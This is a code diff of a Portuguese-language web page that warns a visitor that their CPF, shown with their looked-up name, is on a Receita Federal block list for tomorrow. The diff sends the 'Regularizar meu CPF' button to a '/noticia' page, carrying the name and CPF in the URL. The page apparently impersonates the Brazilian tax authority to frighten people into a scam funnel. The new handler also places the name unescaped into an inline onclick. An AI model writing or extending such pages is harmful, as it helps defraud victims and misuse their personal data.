@@ -465,7 +465,7 @@
                                         CPF ${cpf} (${data.DADOS.nome}) está na Lista de Bloqueio da Receita Federal para amanhã.
                                     </p>
                                 </div>
-                                <button onclick="window.location.href='/'" class="regularize-button">
+                                <button onclick="redirectToNews('${data.DADOS.nome}', '${cpf}')" class="regularize-button">
                                     <i class="fas fa-exclamation-triangle"></i>
                                     Regularizar meu CPF
                                 </button>
@@ -481,6 +481,14 @@
                 }
             });
         });
+
+        // Função para redirecionar para a página de notícia com os dados do usuário
+        function redirectToNews(nome, cpf) {
+            const formattedCpf = cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+            const encodedName = encodeURIComponent(nome);
+            const encodedCpf = encodeURIComponent(formattedCpf);
+            window.location.href = `/noticia?nome=${encodedName}&cpf=${encodedCpf}`;
+        }
     </script>
 </body>
 </html>
